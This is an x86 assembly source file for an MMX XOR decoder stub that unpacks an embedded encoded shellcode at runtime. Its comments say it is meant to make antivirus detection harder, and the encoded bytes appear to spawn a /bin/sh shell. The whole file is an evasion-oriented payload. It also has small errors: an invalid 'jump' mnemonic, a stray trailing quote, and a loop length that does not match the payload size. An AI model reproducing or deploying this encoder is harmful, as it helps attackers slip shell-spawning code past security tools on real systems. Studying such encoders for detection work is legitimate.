; mmx has capabilities to do actions on chunks [8 bytes qword] of data, AV detection is harder
; movq move a block of data
; pxor xor a block of data

global _start

section .text

_start:
    jump short setshellcode ; jump to setshellcode block

decoder:
    pop edi ; decoder value location
    lea esi, [edi + 8] ; shellcode location (decoder value location + 8 byte compensation)
    xor ecx, ecx ; null out ecx
    mov cl, 4 ; 4*8 = 32 bytes

decode:
    movq mm0, qword [edi] ; move encoder into mm0 register
    movq mm1, qword [esi] ; move encoded shellcode into mm1 register 
    pxor mm0, mm1 ; xor encoded shellcode with encoder
    movq qword [esi], mm0 ; overwrite encoded shellcode with unencoded
    add esi, 0x8 ; next 8 bytes of shellcode
    loop decode ; loop until done

    jmp short shellcode ; jump to encoded shellcode



setshellcode:
    call decoder
    decoder_value: db 0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa
    shellcode: db 0x9b,0x6a,0xfa,0xc2,0xc4,0x85,0xd9,0xc2,0xc2,0x85,0x85,0xc8,0xc3,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a"
